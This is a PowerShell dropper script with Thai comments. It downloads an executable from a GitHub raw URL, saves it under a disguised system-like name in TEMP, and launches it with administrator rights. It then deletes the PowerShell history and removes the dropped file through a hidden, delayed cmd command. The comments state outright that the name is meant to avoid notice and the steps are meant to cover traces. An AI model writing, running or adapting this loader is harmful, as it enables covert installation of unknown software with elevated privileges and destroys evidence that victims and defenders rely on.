$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 1. ตั้งชื่อไฟล์ให้เนียนและที่อยู่ไฟล์
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$output = "$env:TEMP\WinSysHelper.exe"

# 2. โหลดไฟล์
Invoke-WebRequest -Uri $url -OutFile $output

# 3. รันแบบ Admin และสั่งให้ลบตัวเองทิ้งเมื่อปิดโปรแกรม (ใช้คำสั่ง cmd ช่วย)
# วิธีนี้จะทำให้ EXE เด้งขึ้นมาแน่นอน และ PowerShell จะปิดตัวเองได้ทันทีโดยไม่กวนการทำงาน
Start-Process -FilePath $output -Verb RunAs

# 4. ใช้คำสั่งลบประวัติ PowerShell
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force

# 5. สั่งล้างไฟล์ใน Temp แบบหน่วงเวลา (ใช้ cmd รันเบื้องหลังเพื่อรอเวลาลบ)
Start-Process cmd -ArgumentList "/c timeout /t 10 && del /f /q `"$output`"" -WindowStyle Hidden

exit
